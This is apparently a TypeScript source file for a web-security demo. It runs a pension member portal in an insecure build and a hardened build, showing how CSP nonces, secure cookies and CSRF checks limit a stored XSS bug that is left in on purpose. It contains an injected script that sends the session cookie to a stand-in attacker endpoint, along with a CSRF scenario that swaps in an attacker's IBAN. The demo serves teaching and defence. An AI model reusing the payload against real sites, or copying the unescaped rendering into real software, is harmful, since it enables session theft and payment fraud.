// The member portal, in two builds from the same code:
//   insecure  (:53052) no security headers, a plain session cookie, no CSRF defence;
//   hardened  (:53152) CSP with a per-request nonce, HSTS and friends, __Host- cookie, CSRF token + Origin check.
// Both keep the same bug on purpose: the employer notice is rendered without escaping (stored XSS).
// The hardened build does not fix the bug; it makes the injected script useless, which is what
// defence in depth means. (Fixing the bug is escaping the notice; do that too.)
import http from "node:http";
import { randomBytes } from "node:crypto";
import { readFileSync } from "node:fs";
import { cookies, csrfToken, hardenedHeaders, keyRing, newNonce, sameOrigin, sessionCookie, signSession, verifyCsrf, verifySession } from "./security.js";

export type Mode = "insecure" | "hardened";
export type CspReport = { at: string; directive: string; blocked: string; document: string; sample: string };

// What an employer admin typed into the notice field (their account was phished): it ends in a script.
export const INJECTED =
  `Contribution statements for 2026 are ready.` +
  `<script>document.getElementById('notice').insertAdjacentHTML('beforeend','<p id="pwned">Injected script ran: your session cookie was sent to the attacker</p>');` +
  `new Image().src='http://localhost:53252/steal?c='+encodeURIComponent(document.cookie)</script>`;

const ATTACKER_IBAN = "XX00 ATTACKER 0000 0000";
const WIDGET = `document.getElementById('widget').textContent = 'widget.js loaded by the inline script (strict-dynamic)';\n`;
const STYLE = readFileSync(new URL("./portal.css", import.meta.url), "utf8");

export function createPortal(mode: Mode, port: number) {
  const origin = `http://localhost:${port}`;
  const hardened = mode === "hardened";
  const keys = hardened ? keyRing() : [];
  const sessions = new Map<string, { name: string; employer: string }>();
  const state = { iban: "FR76 3000 6000 0112 3456 7890 189", reports: [] as CspReport[], events: [] as string[] };

  const log = (msg: string) => {
    state.events.push(msg);
    console.log(`   [${mode} :${port}] ${msg}`);
  };

  function session(req: http.IncomingMessage): string | null {
    const c = cookies(req);
    if (!hardened) return c.session && sessions.has(c.session) ? c.session : null;
    const id = verifySession(keys, c["__Host-session"]);
    return id && sessions.has(id) ? id : null;
  }

  function page(res: http.ServerResponse, status: number, title: string, body: string, extraHeaders: Record<string, string> = {}) {
    const nonce = newNonce();
    const n = hardened ? ` nonce="${nonce}"` : "";
    const headers: Record<string, string> = {
      "content-type": "text/html; charset=utf-8",
      ...(hardened ? hardenedHeaders(nonce) : { "x-powered-by": "Express" }),
      ...extraHeaders,
    };
    res.writeHead(status, headers);
    res.end(`<!doctype html><html lang="en"><head><meta charset="utf-8"><title>${title}</title><style${n}>${STYLE}</style></head>
<body class="${mode}"><header><strong>Member portal</strong><span class="build">${mode} build</span></header><main>${body.replaceAll("NONCE_ATTR", n)}</main></body></html>`);
  }

  async function text(req: http.IncomingMessage): Promise<string> {
    let raw = "";
    for await (const chunk of req) raw += chunk;
    return raw;
  }
  const form = async (req: http.IncomingMessage) => new URLSearchParams(await text(req));

  const server = http.createServer(async (req, res) => {
    const url = new URL(req.url ?? "/", origin);
    const path = url.pathname;

    if (req.method === "POST" && path === "/csp-report") {
      const body = JSON.parse((await text(req)) || "{}");
      // report-uri sends {"csp-report": {...}}; the Reporting API (report-to) sends [{type, body}].
      const list = Array.isArray(body) ? body.map((r) => r.body) : [body["csp-report"]];
      for (const r of list) {
        const rep: CspReport = {
          at: new Date().toISOString(),
          directive: r["effective-directive"] ?? r.effectiveDirective ?? r["violated-directive"],
          blocked: r["blocked-uri"] ?? r.blockedURL,
          document: r["document-uri"] ?? r.documentURL,
          sample: r["script-sample"] ?? r.sample ?? "",
        };
        state.reports.push(rep);
        log(`CSP report: ${rep.directive} blocked ${rep.blocked} on ${rep.document}${rep.sample ? ` sample "${rep.sample}"` : ""}`);
      }
      res.writeHead(204).end();
      return;
    }
    if (path === "/__state") {
      // Demo-only window into the server, so the checks can read what happened. Not part of a real portal.
      res.writeHead(200, { "content-type": "application/json" }).end(JSON.stringify(state));
      return;
    }
    if (path === "/static/widget.js") {
      res.writeHead(200, { "content-type": "text/javascript", ...(hardened ? { "x-content-type-options": "nosniff" } : {}) }).end(WIDGET);
      return;
    }
    if (path === "/login" && req.method === "GET") {
      return page(res, 200, "Sign in", `<h1>Sign in</h1><form method="post" action="/login"><label>Member <input name="name" value="Alice Martin"></label> <button>Sign in</button></form>`);
    }

    if (req.method === "POST" && hardened) {
      const o = sameOrigin(req, origin);
      if (!o.ok) {
        log(`403 POST ${path}: cross-origin request (${o.seen}), session cookie ${session(req) ? "present" : "absent"}`);
        return page(res, 403, "Rejected", `<h1>Request rejected</h1><p class="bad">Cross-origin POST refused (${o.seen}).</p>`);
      }
    }

    if (req.method === "POST" && path === "/login") {
      const f = await form(req);
      const id = randomBytes(18).toString("base64url");
      sessions.set(id, { name: f.get("name") || "Alice Martin", employer: "Acme" });
      log(`signed in ${f.get("name")}`);
      res.writeHead(303, { location: "/", "set-cookie": hardened ? sessionCookie(signSession(keys, id)) : `session=${id}; Path=/` }).end();
      return;
    }

    const sid = session(req);
    if (!sid) {
      if (req.method === "POST") {
        log(`403 POST ${path}: no valid session cookie`);
        return page(res, 403, "Rejected", `<h1>Request rejected</h1><p class="bad">Not signed in.</p>`);
      }
      res.writeHead(303, { location: "/login" }).end();
      return;
    }
    const member = sessions.get(sid)!;

    if (req.method === "POST" && path === "/bank") {
      const f = await form(req);
      if (hardened && !verifyCsrf(keys, sid, f.get("csrf") ?? undefined)) {
        log(`403 POST /bank: missing or wrong CSRF token (${req.headers.origin ?? "no Origin"})`);
        return page(res, 403, "Rejected", `<h1>Request rejected</h1><p class="bad">Missing or wrong CSRF token.</p>`);
      }
      state.iban = f.get("iban") ?? state.iban;
      log(`bank details changed to "${state.iban}" (Origin ${req.headers.origin ?? "none"})`);
      return page(res, 200, "Saved", `<h1>Bank details changed</h1><p class="${state.iban === ATTACKER_IBAN ? "bad" : "good"}">Payments now go to <strong>${state.iban}</strong>.</p><p><a href="/">Back</a></p>`);
    }

    if (path === "/") {
      const token = hardened ? `<input type="hidden" name="csrf" value="${csrfToken(keys, sid)}">` : "";
      return page(
        res,
        200,
        "Your account",
        `<h1>Welcome, ${member.name}</h1><p>Employer: ${member.employer}</p>
<section id="notice"><h2>Message from your employer</h2><div>${INJECTED}</div></section>
<section><h2>Bank details</h2><p>Your pension is paid to <strong id="iban">${state.iban}</strong></p>
<form method="post" action="/bank">${token}<label>New IBAN <input name="iban" size="30"></label> <button>Save</button></form></section>
<p class="scripts">Page scripts: <span id="legit">inline script did not run</span>; <span id="widget">widget.js not loaded</span></p>
<script NONCE_ATTR>document.getElementById('legit').textContent = 'inline script ran${hardened ? " (it carries the nonce)" : ""}';
const s = document.createElement('script'); s.src = '/static/widget.js'; document.body.append(s);</script>`,
      );
    }
    res.writeHead(404).end();
  });

  return { server, state, origin, listen: () => new Promise<void>((r) => server.listen(port, r)) };
}
